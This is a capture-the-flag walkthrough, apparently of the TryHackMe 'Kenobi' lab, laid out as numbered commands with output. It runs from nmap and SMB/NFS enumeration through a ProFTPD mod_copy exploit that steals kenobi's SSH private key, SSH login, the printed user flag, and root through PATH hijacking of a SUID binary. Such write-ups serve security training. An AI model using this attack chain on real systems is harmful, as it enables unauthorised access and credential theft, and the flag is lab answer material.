1. Scan the network.

	$$ nmap -sV 10.10.69.218

	==> Nmap scan report for 10.10.69.218

		PORT     STATE SERVICE     VERSION

		21/tcp   open  ftp         ProFTPD 1.3.5
		22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
		80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
		111/tcp  open  rpcbind     2-4 (RPC #100000)
		139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
		445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
		2049/tcp open  nfs_acl     2-3 (RPC #100227)

		Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

		# Nmap done at Tue Feb  8 13:45:48 2022 -- 1 IP address (1 host up) scanned in 32.96 seconds
		

2. Smb enumeration.

	* 2_Ways:

		1. Enumerate using nmap scripts:

			$$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.69.218

			==> Nmap scan report for 10.10.69.218

				PORT    STATE SERVICE

				445/tcp open  microsoft-ds

				Host script results:
				| smb-enum-shares: 
				|   account_used: guest
				|   \\10.10.69.218\IPC$: 
				|     Type: STYPE_IPC_HIDDEN
				|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
				|     Users: 2
				|     Max Users: <unlimited>
				|     Path: C:\tmp
				|     Anonymous access: READ/WRITE
				|     Current user access: READ/WRITE
				|   \\10.10.69.218\anonymous: 
				|     Type: STYPE_DISKTREE
				|     Comment: 
				|     Users: 0
				|     Max Users: <unlimited>
				|     Path: C:\home\kenobi\share
				|     Anonymous access: READ/WRITE
				|     Current user access: READ/WRITE
				|   \\10.10.69.218\print$: 
				|     Type: STYPE_DISKTREE
				|     Comment: Printer Drivers
				|     Users: 0
				|     Max Users: <unlimited>
				|     Path: C:\var\lib\samba\printers
				|     Anonymous access: <none>
				|_    Current user access: <none>

				# Nmap done at Tue Feb  8 13:59:20 2022 -- 1 IP address (1 host up) scanned in 50.42 seconds


		2. Enumerate using enum4linux tool.

			$$ enum4linux 10.10.69.218

			==>  ========================================= 
				|    Share Enumeration on 10.10.69.218    |
				 ========================================= 

				        Sharename       Type      Comment
				        ---------       ----      -------
				        print$          Disk      Printer Drivers
				        anonymous       Disk      
				        IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))

				[+] Attempting to map shares on 10.10.69.218

				//10.10.69.218/print$   Mapping: DENIED, Listing: N/A
				//10.10.69.218/anonymous        Mapping: OK, Listing: OK
				//10.10.69.218/IPC$     [E] Can't understand response:


3. Login to smb server.

	$$ snbclient //10.10.69.218/anonymous
	$$ ls

	==> log.txt                             N    12237  Wed Sep  4 10:49:09 2019


4. Recursivly download the SMB share.

	$$ smbget -R smb://10.10.69.218/anonymous
	$$ ls -la

	==> -rwxr-xr-x 1 kali kali 12237 Feb  8 14:17 log.txt


5. Enumerate 'rpcbind' using nmap.

	$$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.69.218

	==> Nmap scan report for 10.10.69.218

		PORT    STATE SERVICE
		111/tcp open  rpcbind
		| nfs-showmount: 
		|_  /var *

## Here we got know that we can mount serevr's '/var' directory to our system.


6. Search an exploit of 'ProFTPD 1.3.5'.

	$$ searchsploit ProFTPD 1.3.5

	==> 
		---------------------------------- ---------------------------------
		 Exploit Title                    |  Path
		---------------------------------- ---------------------------------
		ProFTPd 1.3.5 - 'mod_copy' Comman | linux/remote/37262.rb
		ProFTPd 1.3.5 - 'mod_copy' Remote | linux/remote/36803.py
		ProFTPd 1.3.5 - File Copy         | linux/remote/36742.txt
		---------------------------------- ---------------------------------


## Her we got know that we can copy anything from one place to another in the server('mod_copy' vulnerability).


7. Loging in and copy the 'id_rsa' file to '/var' 

	$$ nc 10.10.69.218 21

	==> 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.69.218]

## We are now in the server and we can take advantage of the vulnerability.

8. Copy 'id_rsa' file to '/var' directory.

	$$ site cpfr /home/kenobi/.ssh/id_rsa
	$$ site cpto /var/tmp/id_rsa

	==> 250 Copy successful


9. Mount the server's directory to our local system.

	$$ mkdir /mnt/kenobiNFS
	$$ mount 10.10.69.218:/var /mnt/kenobiNFS
	$$ cd /mnt/kenobiNFS
	$$ ls -la
	$$ cd tmp
	$$ ls -la
	$$ cp id_rsa /ctf/Try_hack_me/kenobi/
	$$ chmod 600 id_rsa


10. Login to kenobi's account using ssh.

	$$ ssh kenobi@10.10.69.218 -i id_rsa

## And we are in. 


11. Grab the User flag.

	$$ cat user.txt

	==> User_Flag: d0b0f3f53b6caa532a83915e19224899


12. Escalate our privilege using SUID binary.

	$$ find / -perm -u=s -type f 2>/dev/null

	## '/usr/bin/menu' isn't a regular binary file. 

	$$ usr/bin/menu

	==> 
		***************************************
		1. status check
		2. kernel version
		3. ifconfig
		** Enter your choice :


	## These menu items are using below commands. 

	$$ curl -I 127.0.0.1
	$$ uname -r
	$$ ifconfig

	## This shows us that the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname)

	## This file runs as the root user privileges.


13. Setup for a root shell.

	$$ cd /tmp
	$$ echo /bin/bash > curl
	$$ chmod 777 curl
	$$ export PATH=/tmp:$PATH


14. Get a root shell.

	$$ /usr/bin/menu

	==> 
		***************************************
		1. status check
		2. kernel version
		3. ifconfig
		** Enter your choice : 1

## we are now root.


15. Verify.

	$$ id 

	==> uid=0(root) gid=100(kenobi) groups=1000(kenobi),4(adm)
